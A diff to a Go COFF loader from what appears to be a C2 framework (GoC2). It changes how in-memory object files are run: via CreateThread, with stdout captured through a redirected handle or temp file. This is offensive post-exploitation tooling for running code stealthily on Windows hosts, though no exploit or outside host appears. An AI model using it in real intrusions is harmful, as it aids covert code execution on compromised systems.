@@ -3,11 +3,14 @@ package coffloader
 import (
 	"encoding/binary"
 	"fmt"
+	"io/ioutil"
+	"os"
 	"strings"
 	"syscall"
 	"unsafe"
 
 	"github.com/latortuga71/GoC2/pkg/winapi"
+	"golang.org/x/sys/windows"
 )
 
 const (
@@ -315,14 +318,56 @@ func ParseCoff(coff []byte) (string, error) {
 			}
 		}
 	}
-	syscall.Syscall(entryPoint, 0, 0, 0, 0)
-	/*_, err = winapi.CreateThread(0, 0, entryPoint, 0, 0, nil)
-	if err != nil {
-		log.Fatal(err)
+	hWnd := winapi.GetConsoleWindow()
+	// no stdout try to use a file instead
+	if hWnd == 0 {
+		f, err := ioutil.TempFile("", "*.log")
+		if err != nil {
+			cleanup(allocationAddresses)
+			return "", err
+		}
+		name := f.Name()
+		f.Close() // close file.
+		hFile := winapi.CreateFile(name, windows.GENERIC_READ|windows.GENERIC_WRITE, windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE, 0, windows.OPEN_ALWAYS, windows.FILE_ATTRIBUTE_NORMAL, 0)
+		if hFile == 0 {
+			cleanup(allocationAddresses)
+			return "", fmt.Errorf("Failed to get handle to tmp file")
+		}
+		err = winapi.SetStdHandle(windows.STD_OUTPUT_HANDLE, windows.Handle(hFile))
+		if err != nil {
+			cleanup(allocationAddresses)
+			return "", err
+		}
+		hThread, err := winapi.CreateThread(0, 0, uintptr(entryPoint), 0, 0, nil)
+		if err != nil {
+			cleanup(allocationAddresses)
+			return "", err
+		}
+		windows.WaitForSingleObject(windows.Handle(hThread), windows.INFINITE)
+		windows.CloseHandle(windows.Handle(hFile))
+		hStdout, err := windows.GetStdHandle(windows.STD_OUTPUT_HANDLE)
+		windows.SetStdHandle(windows.STD_OUTPUT_HANDLE, hStdout)
+		data, err := ioutil.ReadFile(name)
+		if err != nil {
+			cleanup(allocationAddresses)
+			return "", err
+		}
+		os.Remove(name)
+		var result = string(data)
+		cleanup(allocationAddresses)
+		return fmt.Sprintf("COFFEE STDOUT: %s", result), nil
 	}
-	*/
+	ogStdout, NewStdout := winapi.CaptureStdout()
+	hThread, err := winapi.CreateThread(0, 0, uintptr(entryPoint), 0, 0, nil)
+	if err != nil {
+		cleanup(allocationAddresses)
+		return "", err
+	}
+	windows.WaitForSingleObject(windows.Handle(hThread), windows.INFINITE)
+	winapi.RevertStdout(ogStdout, NewStdout)
+	var result string = winapi.GetStdoutBuffer()
 	cleanup(allocationAddresses)
-	return "worked", nil
+	return fmt.Sprintf("COFFEE STDOUT: %s", result), nil
 }
 
 func ResolveSymbols(GOT uintptr, memSymbolsBaseAddress uintptr, nSymbols uint32, memSectionsBaseAddress uintptr) (uintptr, error) {
